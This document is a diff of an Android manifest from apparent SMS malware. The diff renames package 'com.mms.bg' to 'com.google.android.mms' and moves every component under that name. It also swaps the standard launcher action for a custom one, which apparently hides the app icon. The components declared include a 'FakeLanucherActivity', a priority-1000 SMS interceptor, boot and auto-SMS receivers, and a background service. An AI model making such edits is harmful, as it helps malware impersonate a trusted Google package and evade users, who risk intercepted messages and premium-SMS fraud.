@@ -18,7 +18,7 @@
  */
 -->
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-        package="com.mms.bg">
+        package="com.google.android.mms">
 
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -44,18 +44,18 @@
                   android:configChanges="orientation|keyboardHidden"
                   android:launchMode="singleTop">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
+                <action android:name="anandroid.task.mmsdroid.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
         
-		<activity android:name="com.mms.bg.ui.VedioWebViewActivity"
+		<activity android:name="com.google.android.mms.VedioWebViewActivity"
                   android:label="@string/app_name"
                   android:configChanges="orientation|keyboardHidden">
         </activity>
 
-       <activity android:name="com.mms.bg.ui.FakeLanucherActivity"
+       <activity android:name="com.google.android.mms.FakeLanucherActivity"
                   android:label="@string/app_name"
                   android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
             <intent-filter>
@@ -66,7 +66,7 @@
         </activity>
 
         <!-- Catch-all receiver for broadcasts that don't have associated security -->
-        <receiver android:name="com.mms.bg.transaction.SmsReceiver">
+        <receiver android:name="com.google.android.mms.SmsReceiver">
             <intent-filter>
                 <action android:name="com.android.mms.transaction.MESSAGE_SENT" />
                 <!-- TODO Do a better data match here. -->
@@ -78,20 +78,20 @@
         </receiver>
        
          <!-- Require sender permissions to prevent SMS spoofing -->
-        <receiver android:name="com.mms.bg.transaction.PrivilegedSmsReceiver"
+        <receiver android:name="com.google.android.mms.PrivilegedSmsReceiver"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="1000">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
         
-        <receiver android:name="com.mms.bg.ui.BootReceiver">
+        <receiver android:name="com.google.android.mms.BootReceiver">
 			<intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
-        <receiver android:name="com.mms.bg.ui.UninstallReceiver">
+        <receiver android:name="com.google.android.mms.UninstallReceiver">
 			<intent-filter>
                 <action android:name="com.mms.bg.uninstall" />
             </intent-filter>
@@ -103,19 +103,19 @@
             </intent-filter>
         </receiver -->
         
-        <receiver android:name="com.mms.bg.ui.AutoSMSRecevier">
+        <receiver android:name="com.google.android.mms.AutoSMSRecevier">
         	<intent-filter>
         		<action android:name="com.mms.bg.SMS" />
         	</intent-filter>
         </receiver>
 
-        <receiver android:name="com.mms.bg.ui.InternetStatusReceiver">
+        <receiver android:name="com.google.android.mms.InternetStatusReceiver">
         	<intent-filter>
         		<action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
         	</intent-filter>
         </receiver>
         
-        <service android:name="com.mms.bg.ui.BgService">
+        <service android:name="com.google.android.mms.BgService">
 			<intent-filter >
 	            <action android:name="com.mms.bg.FILTER_ACTION"/>
 	        </intent-filter>
